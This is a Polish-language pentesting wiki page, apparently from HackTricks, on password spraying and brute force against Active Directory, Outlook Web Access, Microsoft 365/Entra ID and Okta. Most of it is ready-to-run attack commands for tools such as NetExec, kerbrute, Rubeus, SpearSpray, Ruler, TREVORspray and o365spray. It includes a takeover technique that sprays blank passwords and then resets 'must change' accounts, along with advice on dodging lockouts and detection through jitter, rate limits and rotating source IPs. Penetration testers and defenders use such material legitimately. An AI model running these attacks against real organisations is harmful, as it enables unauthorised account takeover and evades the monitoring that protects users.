# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Po znalezieniu kilku **prawidłowych nazw użytkowników** możesz wypróbować **najczęściej używane hasła** (pamiętając o zasadach haseł obowiązujących w danym środowisku) dla każdego z wykrytych użytkowników.\
**Domyślnie** **minimalna** **długość** **hasła** wynosi 7.

Listy popularnych nazw użytkowników również mogą być przydatne: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Pamiętaj, że **możesz zablokować niektóre konta, jeśli spróbujesz kilku nieprawidłowych haseł** (domyślnie więcej niż 10).

### Uzyskanie zasad haseł

Jeśli masz dane uwierzytelniające użytkownika lub shell jako użytkownik domeny, możesz **uzyskać zasady haseł za pomocą**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Eksploatacja z systemu Linux (lub dowolnego)

- Using **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Używanie **NetExec (następca CME)** do ukierunkowanego sprayowania o niskim poziomie szumu w SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Korzystanie z [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(możesz określić liczbę prób, aby uniknąć blokad kont):**_<sup>[[3]](#references)</sup>
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Używanie [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NIEZALECANE, CZASAMI NIE DZIAŁA<sup>[[2]](#references)</sup>
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Za pomocą modułu `scanner/smb/smb_login` programu **Metasploit**:

![Password Spraying - Brute-Force: Za pomocą modułu scanner/smb/smb login programu Metasploit](<../../images/image (745).png>)

- Za pomocą **rpcclient**:<sup>[[6]](#references)</sup>
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Z Windows

- Z [Rubeus](https://github.com/Zer1t0/Rubeus) w wersji z modułem brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Za pomocą [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Domyślnie może wygenerować użytkowników z domeny, a także pobierze z domeny zasady haseł i ograniczy liczbę prób zgodnie z nimi):<sup>[[4]](#references)</sup>
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Za pomocą [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identyfikowanie i przejmowanie kont „Password must change at next logon” (SAMR)

Technika o niskim poziomie szumu polega na wykonaniu password spraying z użyciem nieszkodliwego/pustego hasła i wykryciu kont zwracających STATUS_PASSWORD_MUST_CHANGE, co wskazuje, że hasło zostało wymuszenie wygaszone i można je zmienić bez znajomości starego hasła.<sup>[[9]](#references)[[10]](#references)</sup>

Workflow:
- Enumerate users (RID brute via SAMR), aby utworzyć listę celów:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Sprayuj puste hasło i kontynuuj po trafieniach, aby przechwycić konta, które muszą zmienić hasło przy następnym logowaniu:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Dla każdego trafienia zmień hasło przez SAMR za pomocą modułu NetExec (stare hasło nie jest wymagane, gdy ustawiono „must change”):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Uwagi operacyjne:
- Upewnij się, że zegar hosta jest zsynchronizowany z DC przed operacjami opartymi na Kerberos: `sudo ntpdate <dc_fqdn>`.
- Znak [+] bez (Pwn3d!) w niektórych modułach (np. RDP/WinRM) oznacza, że dane uwierzytelniające są prawidłowe, ale konto nie ma uprawnień do logowania interaktywnego.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying z targetowaniem LDAP i throttlingiem uwzględniającym PSO (SpearSpray)

Spraying oparty na Kerberos pre-auth generuje mniej szumu niż próby SMB/NTLM/LDAP bind i lepiej odpowiada zasadom blokady kont w AD. SpearSpray łączy targetowanie sterowane przez LDAP, silnik wzorców oraz świadomość zasad (domain policy + PSOs + bufor badPwdCount), aby wykonywać spraying precyzyjnie i bezpiecznie. Może także oznaczać przejęte principals w Neo4j na potrzeby wyznaczania ścieżek w BloodHound.<sup>[[1]](#references)</sup>

Najważniejsze założenia:
- Wykrywanie użytkowników LDAP z obsługą stronicowania i LDAPS, opcjonalnie z użyciem niestandardowych filtrów LDAP.
- Filtrowanie uwzględniające domain lockout policy + PSO, pozostawiające konfigurowalny bufor prób (threshold) i zapobiegające blokowaniu użytkowników.
- Walidacja Kerberos pre-auth z użyciem szybkich bindingów gssapi (generuje 4768/4771 na kontrolerach domeny zamiast 4625).
- Oparte na wzorcach generowanie haseł per user z użyciem zmiennych, takich jak nazwy i wartości czasowe wyprowadzane z pwdLastSet każdego użytkownika.
- Kontrola przepustowości za pomocą wątków, jittera i maksymalnej liczby żądań na sekundę.
- Opcjonalna integracja z Neo4j w celu oznaczania posiadanych użytkowników na potrzeby BloodHound.

Podstawowe użycie i wykrywanie:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Dobór celów i kontrola wzorców:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Kontrole skrytości i bezpieczeństwa:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Wzbogacanie Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Przegląd systemu wzorców (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Dostępne zmienne obejmują:
- {name}, {samaccountname}
- Dane czasowe na podstawie pwdLastSet (lub whenCreated) każdego użytkownika: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Elementy pomocnicze do tworzenia haseł i token organizacji: {separator}, {suffix}, {extra}

Uwagi operacyjne:

- Preferuj odpytywanie PDC-emulatora za pomocą -dc, aby odczytać najbardziej miarodajne wartości badPwdCount oraz informacje związane z polityką.
- Resetowanie badPwdCount jest wyzwalane przy kolejnej próbie po zakończeniu okna obserwacji; używaj odpowiedniego progu i odstępów czasowych, aby zachować bezpieczeństwo.
- Próby Kerberos pre-auth są widoczne w telemetrii kontrolera domeny jako zdarzenia 4768/4771; używaj jitter i rate-limiting, aby się wtopić.

> Wskazówka: Domyślny rozmiar strony LDAP w SpearSpray wynosi 200; w razie potrzeby dostosuj go za pomocą -lps.

## Outlook Web Access

Istnieje wiele narzędzi do **password spraying outlook**.

- Z użyciem [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Z użyciem [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Z użyciem [Ruler](https://github.com/sensepost/ruler) (niezawodne!)<sup>[[5]](#references)</sup>
- Z użyciem [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Z użyciem [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Aby użyć któregokolwiek z tych narzędzi, potrzebujesz listy użytkowników oraz hasła / małej listy haseł do przeprowadzenia password spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

W przypadku cloud spraying najpierw ustal, czy tenant jest **managed**, **federated** czy **hybrid**, ponieważ endpoint i działanie mechanizmu blokady mogą różnić się od on-prem AD. W Microsoft Entra funkcja **Smart Lockout** zmienia sposób, w jaki powtarzane próby wpływają na limit blokady:<sup>[[7]](#references)</sup>

- Powtarzanie **tego samego błędnego hasła** nie powoduje dalszego zwiększania licznika blokady, ale próby z użyciem **nowych kandydatów** już tak.
- Lokalizacje **familiar** i **unfamiliar** mają oddzielne liczniki.
- Tenants korzystające z **pass-through authentication (PTA)** nie odnoszą korzyści ze śledzenia hashy błędnych haseł, dlatego należy traktować je bardziej jak klasyczne cele wrażliwe na blokadę.

W praktyce wykonuj spray **jednym hasłem na rundę**, zachowuj odpowiednie odstępy między rundami i preferuj narzędzia, które mogą wykryć rzeczywisty auth flow tenanta przed wysłaniem prób.

- Za pomocą [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORSpray) możesz przeprowadzić recon tenanta, wykryć `token_endpoint`, wykonywać spray na `msol`/`adfs`/`owa`/`okta` oraz kierować ruch przez wiele wyjściowych adresów IP:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Za pomocą [**Spray365**](https://github.com/MarkoH17/Spray365) możesz wcześniej utworzyć możliwy do wznowienia **plan wykonania**, losować kolejność uwierzytelniania i wymusić **minimalne opóźnienie dla użytkownika**, aby pozostać poza oknem blokady:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Za pomocą [**o365spray**](https://github.com/0xZDH/o365spray) możesz zweryfikować tenant, enumerować użytkowników za pomocą modułów takich jak `onedrive` oraz wykonywać spray przez `oauth2` lub `adfs`, ograniczając się do **jednej próby na użytkownika** w każdym oknie blokady. Jeśli masz już API FireProx, przekaż je za pomocą `--proxy-url`, aby rozdzielić źródłowe adresy IP:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Najnowsze praktyki operatorów obejmują również **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) obsługuje okna czasowe, tasowanie haseł, spraying ADFS/M365 oraz automatyczną eksfiltrację po uwierzytelnieniu. W niedawnych przypadkach rzeczywistego nadużycia wykorzystano również **Microsoft Teams API** do enumeracji kont oraz rotację regionów **AWS**, aby rozłożyć fale sprayingu na wiele lokalizacji źródłowych.<sup>[[8]](#references)</sup>

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [1] [SpearSpray – Enhance Your Active Directory Password Spraying with User Intelligence](https://github.com/sikumy/spearspray)
- [2] [TarlogicSecurity/kerbrute – Kerberos bruteforcing with Impacket (Python)](https://github.com/TarlogicSecurity/kerbrute)
- [3] [Spray – A Password Spraying tool for Active Directory Credentials](https://github.com/Greenwolf/Spray)
- [4] [Active Directory Password Spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [5] [Password Spraying Outlook Web Access: Remote Shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [6] [Password Spraying & Other Fun with RPCCLIENT](https://www.blackhillsinfosec.com/?p=5296)
- [7] [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [8] [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [9] [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [10] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)

{{#include ../../banners/hacktricks-training.md}}
